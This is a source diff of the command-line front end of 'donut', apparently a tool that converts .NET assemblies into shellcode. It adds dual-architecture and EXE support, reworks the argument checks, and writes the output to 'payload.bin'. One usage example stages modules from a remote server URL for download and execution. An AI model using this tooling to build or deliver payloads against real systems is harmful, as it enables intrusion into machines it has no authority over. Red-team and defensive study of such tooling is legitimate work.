-    printf("       -a <arch>            Target architecture : 1=x86, 2=amd64(default).\n");
-    printf("       -r <version>         CLR runtime version. v4.0.30319 is used by default.\n");
+    printf("       -a <arch>            Target architecture : 1=x86, 2=amd64, 3=amd64+x86(default).\n");
+    printf("       -r <version>         CLR runtime version. MetaHeader used by default or v4.0.30319 if none available.\n");
     printf("       -d <name>            AppDomain name to create for assembly. Randomly generated by default.\n\n");
 
     printf(" examples:\n\n");
-    printf("    donut -a 1 -c TestClass -m RunProcess -p notepad.exe -f loader.dll\n");
+    printf("    donut -f assembly.exe\n");
+    printf("    donut -a1 -cTestClass -mRunProcess -pnotepad.exe -floader.dll\n");
     printf("    donut -f loader.dll -c TestClass -m RunProcess -p notepad.exe -u http://remote_server.com/modules/\n");
     
     exit (0);
@@ -632,7 +1009,7 @@ int main(int argc, char *argv[]) {
     char         opt;
     int          i, err;
     FILE         *fd;
-    char         *arch_str[2] = { "x86", "AMD64" };
+    char         *arch_str[3] = { "x86", "AMD64", "x86+AMD64" };
     char         *inst_type[2]= { "PIC", "URL"   };
     
     printf("\n");
@@ -642,9 +1019,9 @@ int main(int argc, char *argv[]) {
     // zero initialize configuration
     memset(&c, 0, sizeof(c));
     
-    // default type is position independent code for AMD64
-    c.type = DONUT_INSTANCE_PIC;
-    c.arch = DONUT_ARCH_X64;
+    // default type is position independent code for dual-mode (x86 + amd64)
+    c.inst_type = DONUT_INSTANCE_PIC;
+    c.arch      = DONUT_ARCH_X84;
     
     // parse arguments
     for(i=1; i<argc; i++) {
@@ -665,7 +1042,7 @@ int main(int argc, char *argv[]) {
           break;
         // assembly to use
         case 'f':
-          c.file   = get_param(argc, argv, &i);
+          c.file     = get_param(argc, argv, &i);
           break;
         // runtime version to use
         case 'r':
@@ -674,7 +1051,7 @@ int main(int argc, char *argv[]) {
         // url of remote assembly
         case 'u': {
           strncpy(c.url, get_param(argc, argv, &i), DONUT_MAX_URL - 2);
-          c.type   = DONUT_INSTANCE_URL;
+          c.inst_type = DONUT_INSTANCE_URL;
           break;
         }
         // class
@@ -695,49 +1072,39 @@ int main(int argc, char *argv[]) {
       }
     }
     
-    // no file?
     if(c.file == NULL) {
-      printf("  [ no .NET assembly specified.\n");
       usage();
     }
-    
-    // no class or method?
-    if(c.cls == NULL || c.method == NULL) {
-      printf("  [ no class or method specified.\n");
-      usage();
-    }
-    
-    if(c.arch != DONUT_ARCH_X86 && 
-       c.arch != DONUT_ARCH_X64)
-    {
-      printf("  [ invalid architecture specified.\n");
-      usage();
-    }
-    
-    printf("  [ Instance Type : %s\n", inst_type[c.type]);
-    printf("  [ .NET Assembly : %s\n", c.file  );
-    printf("  [ Class         : %s\n", c.cls   );
-    printf("  [ Method        : %s\n", c.method);
-    if(c.param != NULL) {
-      printf("  [ Parameters    : %s\n", c.param);
-    }
-    printf("  [ Target CPU    : %s\n", arch_str[c.arch]);
-
-    printf("\n  [ Creating payload...\n");
     
     err = DonutCreate(&c);
     
     if(err != DONUT_ERROR_SUCCESS) {
-      printf("  [ Error returned : %i : %s\n", err, err2str(err));
+      printf("  [ Error : %s\n", err2str(err));
       return 0;
     }
       
-    if(c.type == DONUT_INSTANCE_URL) {
+    printf("  [ Instance Type : %s\n", inst_type[c.inst_type]);
+    printf("  [ .NET Assembly : \"%s\"\n", c.file  );
+    printf("  [ Assembly Type : %s\n", 
+      c.mod_type == DONUT_MODULE_DLL ? "DLL" : "EXE"  );
+    
+    // if this is a DLL, display the class and method
+    if(c.mod_type == DONUT_MODULE_DLL) {
+      printf("  [ Class         : %s\n", c.cls   );
+      printf("  [ Method        : %s\n", c.method);
+    }
+    // if parameters supplied, display them
+    if(c.param != NULL) {
+      printf("  [ Parameters    : %s\n", c.param);
+    }
+    printf("  [ Target CPU    : %s\n", arch_str[c.arch]);
+    
+    if(c.inst_type == DONUT_INSTANCE_URL) {
       printf("  [ Module name   : %s\n", c.modname);
       printf("  [ Upload to     : %s\n", c.url);
     }
     
-    printf("  [ Saving code to \"payload.bin\"\n\n");
+    printf("  [ Shellcode     : \"payload.bin\"\n\n");
     fd = fopen("payload.bin", "wb");
     
     if(fd != NULL) {
